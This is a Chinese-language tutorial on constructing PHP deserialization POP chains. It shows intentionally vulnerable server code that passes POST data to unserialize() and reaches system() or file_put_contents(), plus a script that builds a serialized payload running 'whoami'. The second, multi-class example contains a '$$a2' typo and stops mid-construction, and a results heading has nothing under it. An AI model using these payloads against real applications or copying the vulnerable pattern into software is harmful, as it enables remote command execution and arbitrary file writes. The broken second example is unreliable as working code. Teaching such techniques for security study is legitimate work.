POP 链构造

什么是 POP 链？

POP Chain (Property-Oriented Programming)：通过精心设计对象及其属性，使反序列化后能按预期触发魔术方法，最终执行危险操作的攻击链。

核心方法：反向回溯法

构造POP链的核心思路是从后往前回溯，直到找到反序列化入口点。

1

找到危险函数

确定最终要调用的敏感函数，如 system()、exec()、file_put_contents()

2

回溯魔术方法

找到能调用该危险函数的魔术方法，如 __toString()、__get()、__call()

3

继续回溯

找到能触发该魔术方法的前置条件/其他魔术方法，如 __destruct()、__wakeup()

4

找到入口点

直到找到反序列化入口点 unserialize()，形成完整调用链

POP 链调用流程图

unserialize()

反序列化入口

__destruct()

对象销毁触发

__toString()

对象当字符串

危险函数

system/exec/file_put

调用顺序： unserialize() → __destruct() → __toString() → 危险函数

经典 POP 链示例

服务端代码


// 漏洞类：演示POP链构造
class User {
    public $username;
    public $isAdmin;
    public $cmd;

    // 析构方法：对象销毁时触发
    public function __destruct() {
        // 触发点1：echo $this->username 会调用 __toString()
        echo "Hello, " . $this->username;
    }

    // 字符串方法：对象被当作字符串时触发
    public function __toString() {
        // 触发点2：如果 isAdmin=true，执行系统命令
        if ($this->isAdmin) {
            system($this->cmd);
            return "admin access granted";
        }
        return "not admin";
    }
}

// 反序列化入口点
unserialize($_POST['data']);

1

确定危险函数

目标：执行 system($cmd) 命令

2

找到调用路径

system() 在 __toString() 中被调用

3

确定触发条件

__toString() 需要对象被当作字符串使用

4

找到触发点

__destruct() 中的 echo $this->username 会触发 __toString()

构造过程


class User {
    public $username;
    public $isAdmin;
    public $cmd;
}

// Step 1: 创建内部对象，用于触发危险函数
$user1 = new User();
$user1->isAdmin = true;              // 绕过 admin 检查
$user1->cmd = "whoami";               // 要执行的命令
$user1->username = "john";             // 无实际作用，填充属性

// Step 2: 创建外部对象，用于触发 __toString
$user2 = new User();
$user2->username = $user1;              // 关键！赋值对象引用

// Step 3: 序列化
$payload = serialize($user2);
echo "Payload: " . $payload;

序列化结果

完整调用链

unserialize() → __destruct() (echo $user2->username = $user1) → __toString() (访问$user1) → system("whoami")

更复杂的 POP 链：A/B 类联合

场景说明

当单一类的魔术方法无法直接触发危险函数时，可以利用多个类之间的组合构造更长的POP链。 


class A {
    public $path;
    public $content;

    public function __toString() {
        // 访问 $path->path 触发 __get()
        return ($this->path)->path;
    }

    public function __get($name) {
        // 当访问不存在的path属性时触发
        return $name;
    }
}

class B {
    public $name;
    public $id;
    public $obj;

    public function __wakeup() {
        // 松散比较，如果 name 是对象会触发 __toString()
        if ($this->name == $this->id) {
            echo "name equals id\n";
        }
    }

    public function __get($name) {
        // 危险操作：写入文件
        file_put_contents(($this->obj)->path, ($this->obj)->content);
    }
}

unserialize($_POST['data']);

// 构造写入文件的B对象
$b1 = new B();

// 构造触发__toString的A对象
$a2 = new A();
$$a2->path = $b1;  // 关键！

// 构造触发__wakeup的B对象
$b2 = new B();
